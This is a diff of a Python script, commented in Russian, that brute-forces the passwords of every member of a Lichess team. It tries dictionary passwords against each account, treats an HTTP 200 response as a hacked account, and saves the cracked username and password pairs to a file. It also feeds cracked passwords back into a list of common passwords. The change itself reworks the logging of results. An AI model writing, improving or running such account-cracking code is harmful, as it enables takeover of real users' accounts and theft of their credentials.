@@ -34,7 +34,7 @@ def start(passwords):
         return s[0] + s[1] + s[2] + s[3] + s[6] + s[7]
 
     # Здесь написать ID команды, прога будет взламывать всех участников команды
-    team = input(magenta + "[?] Введите ID команды: ")
+    team = input(magenta + "[?] Введите ID команды: " + white)
 
     # Получаем список людей для взлома
     # Это может занять некоторое время
@@ -72,20 +72,26 @@ def start(passwords):
             #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
             if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
                 print(green + f"{get_ts()} {r}, {username}: {password}")
-
-            elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
-                print(white + f"{get_ts()} {r}, {username}: {password}")
-
-            elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
-                print(red + f"{get_ts()} {r}, {username}: {password}")
-            k += 1
-
-            if str(r) == f"<Response [{str(OK_RESPONSE)}]>": # сохраняем взломанные акки
-                with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:
-                    h_list.write(f"{get_ts()} {username}: {password} \n")
+                with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
+                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
                 with open(f"{PASSWORDS_POPULAR_PATH}", "a", encoding="utf-8") as mb_list: # сохраняем взломанный пароль в пароли типа МБ
                     mb_list.write(f"{password} \n")
+
+            elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
+                print(yellow + f"{get_ts()} {r}, {username}: {password}")
+
+                if SAVE_EVERYTHING_MULTIPART:
+                    with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
+                        h_list.write(f"{get_ts()} {r} {username}: {password} \n")
+
+            elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
+                print(red + f"{get_ts()} {r}, {username}: {password}")
+
+                if SAVE_EVERYTHING_MULTIPART:
+                    with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
+                        h_list.write(f"{get_ts()} {r} {username}: {password} \n")
+            k += 1
 
             time.sleep(5)
             if k % 10 == 0:
@@ -96,6 +102,6 @@ if __name__ == "__main__":
     with open(f"{PASSWORDS_DICT_PATH}", "r", encoding="utf-8") as passwords:
         start(passwords.readlines())
     print(green + "[+] Готово.")
-    input(magenta + "[?] Продолжить? ")
+    input(magenta + "[?] Продолжить? " + white)
     os.system('cls')
     sys.exit()
